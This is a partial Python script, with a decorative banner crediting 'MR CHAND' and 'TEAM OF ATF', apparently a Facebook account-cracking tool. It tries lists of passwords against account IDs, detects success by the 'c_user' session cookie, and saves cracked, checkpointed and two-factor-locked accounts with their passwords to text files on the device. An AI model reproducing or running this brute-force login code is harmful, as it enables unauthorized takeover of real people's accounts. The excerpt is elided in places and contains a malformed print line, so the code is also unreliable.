...
\033[0;95mâ—â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â—\033[1;37mà¹‘Û©â™¡Û©à¹‘\033[0;95mâ—â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â–¬â—
\033[1;39mâ”â–· \033[0;91mð™Šð™’ð™‰ð™€ð™    \033[1;39mâ—ˆâœ™â—ˆ\033[1;33m MR CHAND
\033[1;39mâ”â–· \033[0;91mð™ð™€ð˜¼ð™ˆ     \033[1;39mâ—ˆâœ™â—ˆ\033[1;31m TEAM OF ATF
\033[1;39mâ”â–· \033[0;91mð™”ð™Šð™ð™ð™ð˜½ð™€  \033[1;39mâ—ˆâœ™â—ˆ \033[1;32mCHAND TRICKER
...
def xyz():
    os.getuid
    os.system("clear")
    print('         \x1b[97m[\033[37;41m  THIS COMMAND MADE BY MR CHAND \033[0;97m] ')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/CHAND-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                cid=coki[24:39]
                Red = '\033[1;31m'
                print(f'\r\033[1;31m [CHAND-CP] \nNUMBER : '+uid+'\nPASSWORD   : '+ps+ ')
                open('/sdcard/CHAND-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
                ...
                open('/sdcard/CHAND-2F.txt', 'a').write(cid+' | '+ps+'\n')
                twf.append(cid)
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[CHAND] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
        sys.stdout.flush()
        checks(oks,cps,twf)
    except:
        pass
